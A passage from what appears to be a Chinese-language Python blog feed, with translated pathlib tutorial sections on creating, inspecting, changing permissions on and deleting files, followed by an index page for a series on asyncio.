class="line">Creating example_dir</div><div class="line"></div><div class="line">$ python3 pathlib_mkdir.py</div><div class="line"></div><div class="line">Creating example_dir</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"pathlib_mkdir.py"</span>, line 16, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">    p.mkdir()</div><div class="line">  File <span class="string">".../lib/python3.5/pathlib.py"</span>, line 1214, <span class="keyword">in</span> mkdir</div><div class="line">    self._accessor.mkdir(self, mode)</div><div class="line">  File <span class="string">".../lib/python3.5/pathlib.py"</span>, line 371, <span class="keyword">in</span> wrapped</div><div class="line">    <span class="built_in">return</span> strfunc(str(pathobj), *args)</div><div class="line">FileExistsError: [Errno 17] File exists: <span class="string">'example_dir'</span></div></pre></td></tr></table></figure></p><p>使用symlink_to()创建一个符号链接。该链接将根据路径的值进行命名，并将引用作为symlink_to()的参数的名称。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_symlink_to.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"></div><div class="line">p = pathlib.Path(<span class="string">'example_link'</span>)</div><div class="line"></div><div class="line">p.symlink_to(<span class="string">'index.rst'</span>)</div><div class="line"></div><div class="line">print(p)</div><div class="line">print(p.resolve().name)</div></pre></td></tr></table></figure></p><p>这个例子创建了一个符号链接，然后使用resolve()来读取链接，找到它指向的内容并打印名称。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_symlink_to.py</div><div class="line"></div><div class="line">example_link</div><div class="line">index.rst</div></pre></td></tr></table></figure></p><h2 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h2><p>Path实例包含几种用于测试路径引用的文件类型的方法。本示例创建了多个不同类型的文件，并测试这些文件以及本地操作系统上可用的一些其他设备特定的文件。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_types.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> itertools</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"></div><div class="line">root = pathlib.Path(<span class="string">'test_files'</span>)</div><div class="line"></div><div class="line"><span class="comment"># Clean up from previous runs.</span></div><div class="line"><span class="keyword">if</span> root.exists():</div><div class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> root.iterdir():</div><div class="line">        f.unlink()</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    root.mkdir()</div><div class="line"></div><div class="line"><span class="comment"># Create test files</span></div><div class="line">(root / <span class="string">'file'</span>).write_text(</div><div class="line">    <span class="string">'This is a regular file'</span>, encoding=<span class="string">'utf-8'</span>)</div><div class="line">(root / <span class="string">'symlink'</span>).symlink_to(<span class="string">'file'</span>)</div><div class="line">os.mkfifo(str(root / <span class="string">'fifo'</span>))</div><div class="line"></div><div class="line"><span class="comment"># Check the file types</span></div><div class="line">to_scan = itertools.chain(</div><div class="line">    root.iterdir(),</div><div class="line">    [pathlib.Path(<span class="string">'/dev/disk0'</span>),</div><div class="line">    pathlib.Path(<span class="string">'/dev/console'</span>)],</div><div class="line">)</div><div class="line">hfmt = <span class="string">'&#123;:18s&#125;'</span> + (<span class="string">'  &#123;:&gt;5&#125;'</span> * <span class="number">6</span>)</div><div class="line">print(hfmt.format(<span class="string">'Name'</span>, <span class="string">'File'</span>, <span class="string">'Dir'</span>, <span class="string">'Link'</span>, <span class="string">'FIFO'</span>, <span class="string">'Block'</span>,</div><div class="line">                  <span class="string">'Character'</span>))</div><div class="line">print()</div><div class="line"></div><div class="line">fmt = <span class="string">'&#123;:20s&#125;  '</span> + (<span class="string">'&#123;!r:&gt;5&#125;  '</span> * <span class="number">6</span>)</div><div class="line"><span class="keyword">for</span> f <span class="keyword">in</span> to_scan:</div><div class="line">    print(fmt.format(</div><div class="line">        str(f),</div><div class="line">        f.is_file(),</div><div class="line">        f.is_dir(),</div><div class="line">        f.is_symlink(),</div><div class="line">        f.is_fifo(),</div><div class="line">        f.is_block_device(),</div><div class="line">        f.is_char_device(),</div><div class="line">    ))</div></pre></td></tr></table></figure></p><p>每一个方法，is_dir()、is_file()、is_symlink()、is_socket()、is_fifo()、is_block_device()和is_char_device()都没有参数。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_types.py</div><div class="line"></div><div class="line">Name                File    Dir  Link  FIFO  Block  Character</div><div class="line"></div><div class="line">test_files/fifo      False  False  False  True  False  False</div><div class="line">test_files/file        True  False  False  False  False  False</div><div class="line">test_files/symlink    True  False  True  False  False  False</div><div class="line">/dev/disk0            False  False  False  False  True  False</div><div class="line">/dev/console          False  False  False  False  False  True</div></pre></td></tr></table></figure></p><h2 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h2><p>有关文件的详细信息可以使用stat()或lstat()方法进行访问（用于检查可能是符号链接的东西的状态）。这些方法产生与os.stat()和os.lstat()相同的结果。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_stat.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</div><div class="line">    filename = __file__</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    filename = sys.argv[<span class="number">1</span>]</div><div class="line"></div><div class="line">p = pathlib.Path(filename)</div><div class="line">stat_info = p.stat()</div><div class="line"></div><div class="line">print(<span class="string">'&#123;&#125;:'</span>.format(filename))</div><div class="line">print(<span class="string">'  Size:'</span>, stat_info.st_size)</div><div class="line">print(<span class="string">'  Permissions:'</span>, oct(stat_info.st_mode))</div><div class="line">print(<span class="string">'  Owner:'</span>, stat_info.st_uid)</div><div class="line">print(<span class="string">'  Device:'</span>, stat_info.st_dev)</div><div class="line">print(<span class="string">'  Created      :'</span>, time.ctime(stat_info.st_ctime))</div><div class="line">print(<span class="string">'  Last modified:'</span>, time.ctime(stat_info.st_mtime))</div><div class="line">print(<span class="string">'  Last accessed:'</span>, time.ctime(stat_info.st_atime))</div></pre></td></tr></table></figure></p><p>输出将取决于示例代码的安装方式。尝试在命令行上传递不同的文件名到pathlib_stat.py。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_stat.py</div><div class="line"></div><div class="line">pathlib_stat.py:</div><div class="line">  Size: 607</div><div class="line">  Permissions: 0o100644</div><div class="line">  Owner: 527</div><div class="line">  Device: 16777218</div><div class="line">  Created      : Thu Dec 29 12:25:25 2016</div><div class="line">  Last modified: Thu Dec 29 12:25:25 2016</div><div class="line">  Last accessed: Thu Dec 29 12:25:34 2016</div><div class="line"></div><div class="line">$ python3 pathlib_stat.py index.rst</div><div class="line"></div><div class="line">index.rst:</div><div class="line">  Size: 19363</div><div class="line">  Permissions: 0o100644</div><div class="line">  Owner: 527</div><div class="line">  Device: 16777218</div><div class="line">  Created      : Thu Dec 29 11:27:58 2016</div><div class="line">  Last modified: Thu Dec 29 11:27:58 2016</div><div class="line">  Last accessed: Thu Dec 29 12:25:33 2016</div></pre></td></tr></table></figure></p><p>要更简单地访问有关文件所有者的信息，使用owner()和group()。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_ownership.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"></div><div class="line">p = pathlib.Path(__file__)</div><div class="line"></div><div class="line">print(<span class="string">'&#123;&#125; is owned by &#123;&#125;/&#123;&#125;'</span>.format(p, p.owner(), p.group()))</div></pre></td></tr></table></figure></p><p>当stat()返回数字系统ID值时，这些方法将查找与ID相关联的名称。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_ownership.py</div><div class="line"></div><div class="line">pathlib_ownership.py is owned by dhellmann/dhellmann</div></pre></td></tr></table></figure></p><p>touch()方法与Unix命令touch类似，用于创建文件或更新现有文件的修改时间和权限。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_touch.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line">p = pathlib.Path(<span class="string">'touched'</span>)</div><div class="line"><span class="keyword">if</span> p.exists():</div><div class="line">    print(<span class="string">'already exists'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    print(<span class="string">'creating new'</span>)</div><div class="line"></div><div class="line">p.touch()</div><div class="line">start = p.stat()</div><div class="line"></div><div class="line">time.sleep(<span class="number">1</span>)</div><div class="line"></div><div class="line">p.touch()</div><div class="line">end = p.stat()</div><div class="line"></div><div class="line">print(<span class="string">'Start:'</span>, time.ctime(start.st_mtime))</div><div class="line">print(<span class="string">'End  :'</span>, time.ctime(end.st_mtime))</div></pre></td></tr></table></figure></p><p>多次运行此示例将在后续运行中更新现有文件。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_touch.py</div><div class="line"></div><div class="line">creating new</div><div class="line">Start: Thu Dec 29 12:25:34 2016</div><div class="line">End  : Thu Dec 29 12:25:35 2016</div><div class="line"></div><div class="line">$ python3 pathlib_touch.py</div><div class="line"></div><div class="line">already exists</div><div class="line">Start: Thu Dec 29 12:25:35 2016</div><div class="line">End  : Thu Dec 29 12:25:36 2016</div></pre></td></tr></table></figure></p><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p>在类Unix系统上，可以使用chmod()更改文件权限，将模式作为整数传递。模式值可以使用stat模块中定义的常量来构造。这个例子切换用户的执行权限位。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_chmod.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"><span class="keyword">import</span> stat</div><div class="line"></div><div class="line"><span class="comment"># Create a fresh test file.</span></div><div class="line">f = pathlib.Path(<span class="string">'pathlib_chmod_example.txt'</span>)</div><div class="line"><span class="keyword">if</span> f.exists():</div><div class="line">    f.unlink()</div><div class="line">f.write_text(<span class="string">'contents'</span>)</div><div class="line"></div><div class="line"><span class="comment"># Determine what permissions are already set using stat.</span></div><div class="line">existing_permissions = stat.S_IMODE(f.stat().st_mode)</div><div class="line">print(<span class="string">'Before: &#123;:o&#125;'</span>.format(existing_permissions))</div><div class="line"></div><div class="line"><span class="comment"># Decide which way to toggle them.</span></div><div class="line"><span class="keyword">if</span> <span class="keyword">not</span> (existing_permissions &amp; os.X_OK):</div><div class="line">    print(<span class="string">'Adding execute permission'</span>)</div><div class="line">    new_permissions = existing_permissions | stat.S_IXUSR</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    print(<span class="string">'Removing execute permission'</span>)</div><div class="line">    <span class="comment"># use xor to remove the user execute permission</span></div><div class="line">    new_permissions = existing_permissions ^ stat.S_IXUSR</div><div class="line"></div><div class="line"><span class="comment"># Make the change and show the new value.</span></div><div class="line">f.chmod(new_permissions)</div><div class="line">after_permissions = stat.S_IMODE(f.stat().st_mode)</div><div class="line">print(<span class="string">'After: &#123;:o&#125;'</span>.format(after_permissions))</div></pre></td></tr></table></figure></p><p>脚本假定它具有运行时修改文件模式所需的权限。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_chmod.py</div><div class="line"></div><div class="line">Before: 644</div><div class="line">Adding execute permission</div><div class="line">After: 744</div></pre></td></tr></table></figure></p><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>有两种从文件系统中删除东西的方法，具体取决于类型。要删除空目录，请使用rmdir()。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_rmdir.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"></div><div class="line">p = pathlib.Path(<span class="string">'example_dir'</span>)</div><div class="line"></div><div class="line">print(<span class="string">'Removing &#123;&#125;'</span>.format(p))</div><div class="line">p.rmdir()</div></pre></td></tr></table></figure></p><p>如果后置条件已满足且目录不存在，则会引发FileNotFoundError异常。尝试删除非空的目录也是错误的。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_rmdir.py</div><div class="line"></div><div class="line">Removing example_dir</div><div class="line"></div><div class="line">$ python3 pathlib_rmdir.py</div><div class="line"></div><div class="line">Removing example_dir</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"pathlib_rmdir.py"</span>, line 16, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">    p.rmdir()</div><div class="line">  File <span class="string">".../lib/python3.5/pathlib.py"</span>, line 1262, <span class="keyword">in</span> rmdir</div><div class="line">    self._accessor.rmdir(self)</div><div class="line">  File <span class="string">".../lib/python3.5/pathlib.py"</span>, line 371, <span class="keyword">in</span> wrapped</div><div class="line">    <span class="built_in">return</span> strfunc(str(pathobj), *args)</div><div class="line">FileNotFoundError: [Errno 2] No such file or directory:</div><div class="line"><span class="string">'example_dir'</span></div></pre></td></tr></table></figure></p><p>对于文件，符号链接和大多数其他路径类型使用unlink()。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_unlink.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"></div><div class="line">p = pathlib.Path(<span class="string">'touched'</span>)</div><div class="line"></div><div class="line">p.touch()</div><div class="line"></div><div class="line">print(<span class="string">'exists before removing:'</span>, p.exists())</div><div class="line"></div><div class="line">p.unlink()</div><div class="line"></div><div class="line">print(<span class="string">'exists after removing:'</span>, p.exists())</div></pre></td></tr></table></figure></p><p>用户必须具有删除文件，符号链接，套接字或其他文件系统对象的权限。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_unlink.py</div><div class="line"></div><div class="line">exists before removing: True</div><div class="line">exists after removing: False</div></pre></td></tr></table></figure></p><p><br></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://docs.python.org/3.5/library/pathlib.html" target="_blank" rel="external">Standard library documentation for pathlib</a></li><li><a href="https://pymotw.com/3/os.path/index.html#module-os.path" target="_blank" rel="external">os.path</a> – Platform-independent manipulation of filenames</li><li><a href="https://pymotw.com/3/os/index.html#os-stat" target="_blank" rel="external">Managing File System Permissions</a> – Discussion of os.stat() and os.lstat().</li><li><a href="https://pymotw.com/3/glob/index.html#module-glob" target="_blank" rel="external">glob</a> – Unix shell pattern matching for filenames</li><li><a href="https://www.python.org/dev/peps/pep-0428" target="_blank" rel="external">PEP 428</a> – The pathlib module</li></ul><p><strong>本文翻译自<a href="https://pymotw.com/3/pathlib/" target="_blank" rel="external">《The Python3 Standard Library By Example》</a>pathlib相关章节</strong></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Python模块tips </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>asyncio：异步IO、事件循环和并发</title>
      <link href="/2017/12/21/asyncio%EF%BC%9A%E5%BC%82%E6%AD%A5IO%E3%80%81%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E5%92%8C%E5%B9%B6%E5%8F%91/"/>
      <url>/2017/12/21/asyncio%EF%BC%9A%E5%BC%82%E6%AD%A5IO%E3%80%81%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E5%92%8C%E5%B9%B6%E5%8F%91/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>asyncio：异步IO、事件循环和并发</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>asyncio模块提供了使用协程构建并发程序的工具。threading模块通过多线程实现并发，multiprocessing模块通过系统进程实现并发，asyncio则使用单线程单进程在程序中明确的时间点切换任务来实现并发。大多数情况下是在程序阻塞等待读取数据或者写入数据时发生任务切换的，但是asyncio还支持定时调度任务，能过让一个协程等待其他的完成，处理系统信号，等等功能。</p><h3 id="异步并发的概念"><a href="#异步并发的概念" class="headerlink" title="异步并发的概念"></a><a href="https://hatboy.github.io/2017/12/21/asyncio%E4%B9%8B%E5%BC%82%E6%AD%A5%E5%B9%B6%E5%8F%91%E7%9A%84%E6%A6%82%E5%BF%B5/">异步并发的概念</a></h3><h3 id="使用协程处理多任务"><a href="#使用协程处理多任务" class="headerlink" title="使用协程处理多任务"></a><a href="https://hatboy.github.io/2017/12/21/asyncio%E4%B9%8B%E4%BD%BF%E7%94%A8%E5%8D%8F%E7%A8%8B%E5%A4%84%E7%90%86%E5%A4%9A%E4%BB%BB%E5%8A%A1/">使用协程处理多任务</a></h3><ul><li>启动协程</li><li>协程返回值</li><li>协程链</li><li>生成器替代协程</li></ul><h3 id="定时调度常规函数"><a href="#定时调度常规函数" class="headerlink" title="定时调度常规函数"></a><a href="https://hatboy.github.io/2017/12/21/asyncio%E4%B9%8B%E5%AE%9A%E6%97%B6%E8%B0%83%E5%BA%A6%E5%B8%B8%E8%A7%84%E5%87%BD%E6%95%B0/">定时调度常规函数</a></h3><ul><li>计划调度“Soon”</li><li>延迟调度</li><li>特定时间调度</li></ul><h3 id="异步生产结果"><a href="#异步生产结果" class="headerlink" title="异步生产结果"></a><a href="https://hatboy.github.io/2017/12/21/asyncio%E4%B9%8B%E5%BC%82%E6%AD%A5%E7%94%9F%E4%BA%A7%E7%BB%93%E6%9E%9C/">异步生产结果</a></h3><ul><li>等待Future</li><li>Future回调</li></ul><h3 id="并发执行Tasks"><a href="#并发执行Tasks" class="headerlink" title="并发执行Tasks"></a><a href="https://hatboy.github.io/2017/12/21/asyncio%E4%B9%8B%E5%B9%B6%E5%8F%91%E6%89%A7%E8%A1%8CTasks/">并发执行Tasks</a></h3><ul><li>启动Task</li><li>取消Task</li><li>从协程创建Task</li></ul><h3 id="用控制结构组建协程"><a href="#用控制结构组建协程" class="headerlink" title="用控制结构组建协程"></a><a href="https://hatboy.github.io/2017/12/21/asyncio%E4%B9%8B%E7%94%A8%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%84%E7%BB%84%E5%BB%BA%E5%8D%8F%E7%A8%8B/">用控制结构组建协程</a></h3><ul><li>等待多个协程</li><li>从协程聚集结果</li><li>操作完成时进行处理</li></ul><h3 id="同步原语"><a href="#同步原语" class="headerlink" title="同步原语"></a><a href="https://hatboy.github.io/2017/12/21/asyncio%E4%B9%8B%E5%90%8C%E6%AD%A5%E5%8E%9F%E8%AF%AD/">同步原语</a></h3><ul><li>Locks</li><li>Events</li><li>Conditions</li><li>Queues</li></ul><h3 id="协议抽象类的异步I-O"><a href="#协议抽象类的异步I-O" class="headerlink" title="协议抽象类的异步I/O"></a><a href="https://hatboy.github.io/2017/12/21/asyncio%E4%B9%8B%E5%8D%8F%E8%AE%AE%E6%8A%BD%E8%B1%A1%E7%B1%BB%E7%9A%84%E5%BC%82%E6%AD%A5I-O/">协议抽象类的异步I/O</a></h3><ul><li>Echo Server</li><li>Echo Client</li><li>输出</li><li>其他实例</li></ul><h3 id="使用协程和流的异步I-O"><a href="#使用协程和流的异步I-O" class="headerlink" title="使用协程和流的异步I/O"></a><a href="https://hatboy.github.io/2017/12/21/asyncio%E4%B9%8B%E4%BD%BF%E7%94%A8%E5%8D%8F%E7%A8%8B%E5%92%8C%E6%B5%81%E7%9A%84%E5%BC%82%E6%AD%A5I-O/">使用协程和流的异步I/O</a></h3><ul><li>Echo Server</li><li>Echo Client</li><li>输出</li><li>其他实例</li></ul><h3 id="使用SSL"><a href="#使用SSL" class="headerlink" title="使用SSL"></a><a href="https://hatboy.github.io/2017/12/21/asyncio%E4%B9%8B%E4%BD%BF%E7%94%A8SSL/">使用SSL</a></h3><h3 id="与DNS服务进行交互"><a href="#与DNS服务进行交互" class="headerlink" title="与DNS服务进行交互"></a><a href="https://hatboy.github.io/2017/12/21/asyncio%E4%B9%8B%E4%B8%8EDNS%E6%9C%8D%E5%8A%A1%E8%BF%9B%E8%A1%8C%E4%BA%A4%E4%BA%92/">与DNS服务进行交互</a></h3><ul><li>按名称查询地址</li><li>按地址查询名称</li></ul><h3 id="使用子进程"><a href="#使用子进程" class="headerlink" title="使用子进程"></a><a href="https://hatboy.github.io/2017/12/21/asyncio%E4%B9%8B%E4%BD%BF%E7%94%A8%E5%AD%90%E8%BF%9B%E7%A8%8B/">使用子进程</a></h3><ul><li>使用协议抽象子进程</li><li>使用协程和流子进程</li><li>发送数据到子进程</li></ul><h3 id="接收Unix信号"><a href="#接收Unix信号" class="headerlink" title="接收Unix信号"></a><a href="https://hatboy.github.io/2017/12/21/asyncio%E4%B9%8B%E6%8E%A5%E6%94%B6Unix%E4%BF%A1%E5%8F%B7/">接收Unix信号</a></h3><h3 id="协程结合线程和进程"><a href="#协程结合线程和进程" class="headerlink" title="协程结合线程和进程"></a><a href="https://hatboy.github.io/2017/12/21/asyncio%E4%B9%8B%E5%8D%8F%E7%A8%8B%E7%BB%93%E5%90%88%E7%BA%BF%E7%A8%8B%E5%92%8C%E8%BF%9B%E7%A8%8B/">协程结合线程和进程</a></h3><ul><li>线程</li><li>进程</li></ul><h3 id="调试asyncio"><a href="#调试asyncio" class="headerlink" title="调试asyncio"></a><a href="https://hatboy.github.io/2017/12/21/asyncio%E4%B9%8B%E8%B0%83%E8%AF%95asyncio/">调试asyncio</a></h3><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>在Python 3.5中，asyncio仍然是一个临时模块，这个API在Python 3.6中稳定了，大部分的变化被反向移植到了Python 3.5的补丁版本。因此，在不同版本的Python 3.5下，该模块可能会略有不同。</p><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="https://docs.python.org/3.5/library/asyncio.html" target="_blank" rel="external">Standard library documentation for asyncio</a></li><li><a href="https://www.python.org/dev/peps/pep-3156" target="_blank" rel="external">PEP 3156</a> – Asynchronous IO Support Rebooted: the “asyncio” Module</li><li><a href="https://www.python.org/dev/peps/pep-0380" target="_blank" rel="external">PEP 380</a> – Syntax for Delegating to a Subgenerator</li><li><a href="https://www.python.org/dev/peps/pep-0492" target="_blank" rel="external">PEP 492</a> – Coroutines with async and await syntax</li><li><a href="https://pymotw.com/3/concurrent.futures/index.html#module-concurrent.futures" target="_blank" rel="external">concurrent.futures</a> – Manage Pools of Concurrent Tasks</li><li><a href="https://pymotw.com/3/socket/index.html#module-socket" target="_blank" rel="external">socket</a> – Low-level network communication</li><li><a href="https://pymotw.com/3/select/index.html#module-select" target="_blank" rel="external">select</a> – Low-level asynchronous I/O tools</li><li><a href="https://pymotw.com/3/socketserver/index.html#module-socketserver" target="_blank" rel="external">socketserver</a> – Framework for creating network servers</li><li><a href="https://docs.python.org/3/whatsnew/3.6.html#asyncio" target="_blank" rel="external">asyncio: What’s New in Python 3.6</a> – Summary of the changes to asyncio as the API stablized in Python 3.6.</li><li><a href="https://pypi.python.org/pypi/trollius" target="_blank" rel="external">trollius</a> – A port of Tulip, the original version of asyncio, to Python 2.</li><li><a href="http://www.drdobbs.com/open-source/the-new-asyncio-module-in-python-34-even/240168401" target="_blank" rel="external">The New asyncio Module in Python 3.4: Event Loops</a> – Article by Gastón Hillar in Dr. Dobb’s</li><li><a href="http://www.giantflyingsaucer.com/blog/?p=5557" target="_blank" rel="external">Exploring Python 3’s Asyncio by Example</a> – Blog post by Chat Lung</li><li><a href="http://aosabook.org/en/500L/a-web-crawler-with-asyncio-coroutines.html" target="_blank" rel="external">A Web Crawler With asyncio Coroutines</a> – An article in The Architecture of Open Source Applications by A. Jesse Jiryu Davis and Guido van Rossum</li><li><a href="http://www.getoffmalawn.com/blog/playing-with-asyncio" target="_blank" rel="external">Playing with asyncio</a> – blog post by Nathan Hoad</li><li><a href="https://blogs.gnome.org/markmc/2013/06/04/async-io-and-python/" target="_blank" rel="external">Async I/O and Python</a> – blog post by Mark McLoughlin</li><li><a href="http://www.dabeaz.com/coroutines/" target="_blank" rel="external">A Curious Course on Coroutines and Concurrency</a> – PyCon 2009 tutorial by David Beazley</li><li><a href="http://www.snarky.ca/how-the-heck-does-async-await-work-in-python-3-5" target="_blank" rel="external">How the heck does async/await work in Python 3.5?</a> – blog post by Brett Cannon</li><li>Unix Network Programming, Volume 1: The Sockets Networking API, 3/E By W. Richard Stevens, Bill Fenner, and Andrew M. Rudoff. Published by Addison-Wesley Professional, 2004. ISBN-10: 0131411551</li><li>Foundations of Python Network Programminng, 3/E By Brandon Rhodes and John Goerzen. Published by Apress, 2014. ISBN-10: 1430258543</li></ul><p><strong>本文翻译自<a href="https://pymotw.com/3/asyncio/index.html" target="_blank" rel="external">《The Python3 Standard Library By Example》asyncio</a>相关章节</strong></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> asyncio </tag>
            
            <tag> 异步并发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>asyncio之调试asyncio</title>
